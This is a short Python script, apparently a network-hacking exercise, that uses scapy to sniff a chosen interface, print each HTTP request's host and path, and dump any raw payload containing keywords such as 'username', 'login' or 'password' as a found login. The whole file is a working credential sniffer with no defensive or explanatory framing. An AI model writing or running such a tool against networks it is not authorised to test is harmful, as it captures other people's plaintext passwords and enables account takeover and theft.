import scapy.all as scapy
from scapy.layers import http
import optparse


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-i","--interface", dest="network_interface", help="Your Netowrk interface eth0,wlan0..")
    options,_ = parser.parse_args()
    
    if not options.network_interface:
        print("[-] Enter Network Interface -i <interface>")
        parser.error("[!] -h --help For More Help")

    return options


options = get_args()
interface = options.network_interface

def Sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=proccess_packet)


def proccess_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request >> "+ str(url) )
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username","user","login","password","pass","passwd"]  
            for key in keywords:
                if key in str(load):
                    print("\n\n[!] Login Found >> "+ str(load) + "\n\n")
                    break


Sniff(interface)